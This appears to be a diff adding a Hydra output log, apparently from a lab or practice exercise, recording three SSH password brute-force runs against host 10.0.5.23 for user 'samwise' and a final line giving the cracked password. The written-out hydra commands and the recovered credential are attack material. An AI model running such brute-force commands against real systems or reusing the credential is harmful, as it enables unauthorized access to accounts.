@@ -1,0 +1,4 @@
+# Hydra v9.5 run at 2025-09-29 23:13:08 on 10.0.5.23 ssh (hydra -l samwise -P samwise.txt -t 4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss 10.0.5.23 ssh)
+# Hydra v9.5 run at 2025-09-29 23:14:40 on 10.0.5.23 ssh (hydra -l samwise -P samwise.txt -t 4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss 10.0.5.23 ssh)
+# Hydra v9.5 run at 2025-09-29 23:16:58 on 10.0.5.23 ssh (hydra -l samwise -P samwise.txt -t 4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss 10.0.5.23 ssh)
+[22][ssh] host: 10.0.5.23   login: samwise   password: SamwiseGamgee19
